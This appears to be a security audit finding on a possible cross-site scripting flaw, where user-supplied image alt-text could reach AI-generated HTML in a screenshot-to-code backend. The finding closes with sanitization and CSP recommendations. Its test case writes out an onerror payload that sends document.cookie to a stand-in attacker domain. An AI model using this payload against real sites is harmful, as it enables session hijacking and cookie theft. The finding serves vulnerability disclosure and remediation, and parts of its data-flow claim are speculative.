# Vulnerabilities Matching Conditions:

## 1. Potential Cross-Site Scripting (XSS) via Image Alt-Text Injection

- **Vulnerability Name:** Cross-Site Scripting (XSS) via Image Alt-Text Injection
- **Description (step by step):**
    1. An attacker provides a malicious screenshot containing an alt-text metadata field embedded with malicious JavaScript code.
    2. The backend application processes uploaded images and utilizes AI to directly include user-supplied alt-text into generated HTML or React frontend components without sufficient escaping or input validation.
    3. The frontend receives and further renders this generated code directly, resulting in execution of the malicious JavaScript payload when viewed by other users.
- **Impact:**
    - Execution of arbitrary JavaScript scripts within the context of the victim's browser, enabling attacks such as session hijacking, stealing sensitive user information, or defacing the application UI.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Currently, placeholder images and AI-generated descriptions are predominantly employed, offering limited incidental protection.
- **Missing Mitigations:**
    - Explicit sanitization routines for user-supplied alt-text before embedding into generated frontend code.
    - Lack of encoded or escaped characters in generated HTML content.
    - No strict Content Security Policy (CSP) implementation observed.
- **Preconditions:**
    - Attacker must have the ability to upload a screenshot with attacker-controlled malicious alt-text metadata.
    - AI-based backend must directly embed attacker-provided alt-text into resulting HTML for frontend rendering without encoding or validation.
- **Source Code Analysis:**
    1. Backend file: `backend/image_generation/core.py` handles image alt attributes without visible input sanitization:
        ```python
        for img in images:
            if not img["src"].startswith("https://placehold.co"):
                mapping[img["alt"]] = img["src"]
        ```
        This process takes user-supplied input directly without visible escaping or encoding routines.

    2. The processed alt-text potentially propagates downstream into dynamically generated code by backend services at (`backend/llm.py`), embedding unsanitized alt-text.
    3. Generated HTML transferred directly to frontend interfaces via API responses (`/generate-code`) without validation.

- **Security Test Case:**
    1. Upload a screenshot with manipulated alt-text:
        ```html
        "><img src=x onerror=document.location='http://attacker-domain.com/?'+document.cookie>
        ```
    2. Submit for frontend code generation.
    3. Backend processes without sanitization, embedding malicious alt-text into generated frontend code.
    4. Frontend renders the preview of generated HTML.
    5. Malicious JavaScript executes within browser context upon rendering, stealing cookies and triggering HTTP request to the attacker-controlled domain.

## Recommendations for fixing vulnerabilities:

- **Explicit Input sanitization:**
  - Implement encoding or escaping routines using libraries such as **Bleach** (Python) or appropriate React/Frontend sanitizers (e.g., **DOMPurify**).
  - Ensure backend implementation (`backend/image_generation/core.py` and `backend/llm.py`) explicitly sanitize or encode all user-generated inputs before using within HTML-generating components.

- **Content Security Policy (CSP):**
  - Implement a strict Content Security Policy header, restricting execution contexts and preventing untrusted script execution within rendered HTML pages, significantly reducing the impact of successful injections.
